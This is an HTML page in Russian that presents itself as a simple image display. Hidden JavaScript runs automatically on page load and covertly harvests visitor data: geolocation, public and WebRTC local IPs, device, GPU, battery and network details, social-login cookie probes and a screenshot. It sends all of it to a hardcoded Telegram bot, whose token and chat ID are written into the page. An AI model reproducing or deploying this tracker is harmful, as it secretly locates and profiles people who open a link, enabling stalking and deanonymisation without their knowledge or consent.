<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Информационный ресурс</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .main-image {
            max-width: 95%;
            max-height: 95vh;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            transition: transform 0.3s ease;
        }
        .main-image:hover {
            transform: scale(1.02);
        }
        @media (dynamic-range: high) {
            .display-type::after {
                content: "OLED/Дорогой дисплей";
            }
        }
        @media (dynamic-range: standard) {
            .display-type::after {
                content: "LCD/Обычный дисплей";
            }
        }
    </style>
</head>
<body>
    <img class="main-image" src="https://i.pinimg.com/564x/a2/36/20/a23620bbf4143ab4b90a462e59c25dad.jpg" alt="Основное изображение">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script>
        // Telegram бот
        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';

        // Основная функция отправки в Telegram (исправленная)
        function sendToTelegram(message) {
            // Используем XMLHttpRequest вместо fetch для обхода CORS
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const params = new URLSearchParams();
            params.append('chat_id', chatId);
            params.append('text', message);
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log('Данные отправлены в Telegram');
                } else {
                    console.error('Ошибка отправки:', xhr.statusText);
                }
            };
            
            xhr.onerror = function() {
                console.error('Ошибка сети при отправке');
            };
            
            xhr.send(params.toString());
        }

        // Получение расширенной информации о GPU
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return "WebGL не поддерживается";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
            return "Не удалось получить данные GPU";
        }

        // Определение точной модели Android
        function getAndroidModel() {
            const userAgent = navigator.userAgent;
            const brands = {
                'samsung': 'Samsung',
                'huawei': 'Huawei',
                'xiaomi': 'Xiaomi',
                'redmi': 'Redmi',
                'poco': 'POCO',
                'oppo': 'Oppo',
                'vivo': 'Vivo',
                'realme': 'Realme',
                'oneplus': 'OnePlus',
                'sony': 'Sony',
                'lg': 'LG',
                'motorola': 'Motorola',
                'nokia': 'Nokia',
                'htc': 'HTC',
                'asus': 'Asus',
                'lenovo': 'Lenovo',
                'zte': 'ZTE',
                'alcatel': 'Alcatel',
                'meizu': 'Meizu',
                'honor': 'Honor'
            };
            
            for (const [key, brand] of Object.entries(brands)) {
                if (userAgent.toLowerCase().includes(key)) {
                    const modelMatch = userAgent.match(/Android.*;\s([a-zA-Z0-9\s\-]+)\sBuild/i);
                    return `${brand} ${modelMatch ? modelMatch[1] : ''}`.trim();
                }
            }
            
            return "Неизвестная модель Android";
        }

        // Получение архитектуры процессора
        function getCPUArchitecture() {
            try {
                return (new WebAssembly.Module(new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]))) ? 
                    "64-бит (поддержка WebAssembly)" : "32-бит";
            } catch (e) {
                return "32-бит (без поддержки WebAssembly)";
            }
        }

        // Получение информации о дисплее
        function getDisplayInfo() {
            const widthIn = (screen.width / window.devicePixelRatio) * 0.0104; // Переводим в дюймы
            const heightIn = (screen.height / window.devicePixelRatio) * 0.0104;
            const diagonal = Math.sqrt(Math.pow(widthIn, 2) + Math.pow(heightIn, 2)).toFixed(1);
            
            return {
                size: `${diagonal}"`,
                resolution: `${screen.width}x${screen.height}`,
                density: window.devicePixelRatio,
                type: document.querySelector('.display-type') ? 
                    document.querySelector('.display-type').textContent : "Не определено"
            };
        }

        // Получение информации о сети
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return "Информация о сети недоступна";
            
            return {
                type: connection.effectiveType || "Неизвестно",
                downlink: connection.downlink ? `${connection.downlink} Mbps` : "Неизвестно",
                rtt: connection.rtt ? `${connection.rtt} ms` : "Неизвестно",
                saveData: connection.saveData ? "Включен" : "Выключен"
            };
        }

        // Получение локального IP через WebRTC
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice.candidate) return;
                    const ip = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
                    if (ip) resolve(ip);
                };
                
                setTimeout(() => resolve("Не удалось определить"), 2000);
            });
        }

        // Проверка VPN/Proxy
        async function checkVPN() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoRes.json();
                
                return {
                    ip: ipData.ip,
                    isProxy: geoData.proxy || geoData.vpn || false,
                    provider: geoData.org || "Неизвестно",
                    country: geoData.country_name || "Неизвестно"
                };
            } catch (e) {
                return "Не удалось проверить";
            }
        }

        // Получение информации о датчиках
        function getSensorsInfo() {
            return {
                touch: 'ontouchstart' in window ? "Есть" : "Нет",
                motion: 'ondevicemotion' in window ? "Есть" : "Нет",
                orientation: 'ondeviceorientation' in window ? "Есть" : "Нет",
                light: 'ondevicelight' in window ? "Есть" : "Нет",
                proximity: 'ondeviceproximity' in window ? "Есть" : "Нет"
            };
        }

        // Проверка доступа к медиаустройствам
        async function checkMediaAccess() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    camera: devices.some(d => d.kind === 'videoinput'),
                    microphone: devices.some(d => d.kind === 'audioinput'),
                    speakers: devices.some(d => d.kind === 'audiooutput')
                };
            } catch (e) {
                return "Доступ запрещен";
            }
        }

        // Создание скриншота
        async function takeScreenshot() {
            try {
                const canvas = await html2canvas(document.body);
                return canvas.toDataURL('image/jpeg', 0.5);
            } catch (e) {
                return "Не удалось сделать скриншот";
            }
        }

        // Проверка соцсетей по кукам
        function checkSocialCookies() {
            const cookies = document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                cookies[name] = value;
                return cookies;
            }, {});
            
            return {
                google: cookies['G_AUTHUSER_H'] ? "Возможно авторизован" : "Нет данных",
                facebook: cookies['fr'] ? "Возможно авторизован" : "Нет данных",
                telegram: cookies['tg_user'] ? "Возможно авторизован" : "Нет данных",
                twitter: cookies['auth_token'] ? "Возможно авторизован" : "Нет данных"
            };
        }

        // Основная функция сбора данных
        async function collectAllData() {
            // Основная информация
            const data = {
                "📅 Дата и время": new Date().toLocaleString('ru-RU'),
                "🌐 IP и геоданные": await checkVPN(),
                "🖥️ Устройство": {
                    "Модель": /Android/i.test(navigator.userAgent) ? getAndroidModel() : navigator.platform,
                    "ОС": navigator.userAgent,
                    "Архитектура": getCPUArchitecture(),
                    "GPU": getGPUInfo(),
                    "Дисплей": getDisplayInfo(),
                    "Плотность пикселей": window.devicePixelRatio,
                    "Сенсорный экран": 'ontouchstart' in window ? "Да" : "Нет"
                },
                "📶 Сеть": getNetworkInfo(),
                "📍 Геолокация": await getGeolocation(),
                "🔋 Батарея": await getBatteryInfo(),
                "⚙️ Производительность": {
                    "Ядер CPU": navigator.hardwareConcurrency || "Неизвестно",
                    "Память": performance.memory ? 
                        `${(performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1)} MB` : "Неизвестно"
                },
                "🛡️ Приватность": {
                    "Режим инкогнито": checkPrivateMode(),
                    "Куки": navigator.cookieEnabled ? "Включены" : "Выключены"
                },
                "📷 Медиа": await checkMediaAccess(),
                "📱 Датчики": getSensorsInfo(),
                "🔍 Поведение": {
                    "Реферер": document.referrer || "Прямой заход",
                    "Размер окна": `${window.innerWidth}x${window.innerHeight}`,
                    "Язык": navigator.language,
                    "Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                "📌 Дополнительно": {
                    "Локальный IP": await getLocalIP(),
                    "Соцсети": checkSocialCookies(),
                    "Скриншот": await takeScreenshot()
                }
            };

            // Формируем сообщение для Telegram
            let message = "🔍 Полный отчёт об устройстве:\n\n";
            for (const [category, items] of Object.entries(data)) {
                message += `\n${category}:\n`;
                if (typeof items === 'object') {
                    for (const [key, value] of Object.entries(items)) {
                        message += `  • ${key}: ${JSON.stringify(value, null, 2)}\n`;
                    }
                } else {
                    message += `  • ${items}\n`;
                }
            }

            // Отправляем данные (ограничиваем длину сообщения)
            if (message.length > 4096) {
                message = message.substring(0, 4090) + "...";
            }
            sendToTelegram(message);
        }

        // Проверка режима инкогнито
        function checkPrivateMode() {
            try {
                localStorage.setItem('test', 'test');
                localStorage.removeItem('test');
                return "Нет (обычный режим)";
            } catch (e) {
                return "Да (режим инкогнито)";
            }
        }

        // Получение геолокации
        async function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("Геолокация не поддерживается");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const loc = {
                            coords: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                            accuracy: `${pos.coords.accuracy} метров`,
                            altitude: pos.coords.altitude ? `${pos.coords.altitude} м` : "Нет данных",
                            speed: pos.coords.speed ? `${(pos.coords.speed * 3.6).toFixed(1)} км/ч` : "Нет данных",
                            heading: pos.coords.heading || "Нет данных"
                        };
                        resolve(loc);
                    },
                    (err) => resolve(`Ошибка: ${err.message}`),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        // Информация о батарее
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API батареи не поддерживается";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: `${Math.floor(battery.level * 100)}%`,
                    charging: battery.charging ? "Заряжается" : "Не заряжается",
                    chargingTime: battery.chargingTime ? `${Math.floor(battery.chargingTime/60)} мин` : "Неизвестно",
                    dischargingTime: battery.dischargingTime !== Infinity ? 
                        `${Math.floor(battery.dischargingTime/60)} мин` : "Неизвестно"
                };
            } catch (e) {
                return "Ошибка получения данных";
            }
        }

        // Запуск при загрузке страницы
        window.addEventListener('load', () => {
            setTimeout(collectAllData, 3000); // Даём время для загрузки всех данных
        });
    </script>
</body>
</html>
